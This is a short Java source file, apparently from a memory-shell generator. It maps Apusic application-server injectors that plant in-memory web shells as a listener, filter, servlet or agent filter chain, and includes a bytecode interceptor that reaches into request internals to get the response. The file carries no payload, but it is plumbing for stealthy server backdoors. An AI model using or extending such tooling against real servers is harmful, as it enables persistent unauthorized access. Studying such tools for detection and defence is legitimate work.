package com.reajason.javaweb.memshell.server;

import com.reajason.javaweb.memshell.injector.apusic.ApusicFilterChainAgentInjector;
import com.reajason.javaweb.memshell.injector.apusic.ApusicFilterInjector;
import com.reajason.javaweb.memshell.injector.apusic.ApusicListenerInjector;
import com.reajason.javaweb.memshell.injector.apusic.ApusicServletInjector;
import com.reajason.javaweb.utils.ShellCommonUtil;
import net.bytebuddy.asm.Advice;

import static com.reajason.javaweb.memshell.ShellType.*;

/**
 * @author ReaJason
 * @since 2024/12/27
 */
public class Apusic extends AbstractServer {

    public static class ListenerInterceptor {
        @Advice.OnMethodExit
        public static void enter(@Advice.Argument(0) Object request, @Advice.Return(readOnly = false) Object response) throws Exception {
            response = ShellCommonUtil.getFieldValue(ShellCommonUtil.getFieldValue(request, "http"), "response");
        }
    }

    @Override
    public Class<?> getListenerInterceptor() {
        return ListenerInterceptor.class;
    }

    @Override
    public InjectorMapping getShellInjectorMapping() {
        return InjectorMapping.builder()
                .addInjector(LISTENER, ApusicListenerInjector.class)
                .addInjector(FILTER, ApusicFilterInjector.class)
                .addInjector(SERVLET, ApusicServletInjector.class)
                .addInjector(AGENT_FILTER_CHAIN, ApusicFilterChainAgentInjector.class)
                .build();
    }
}
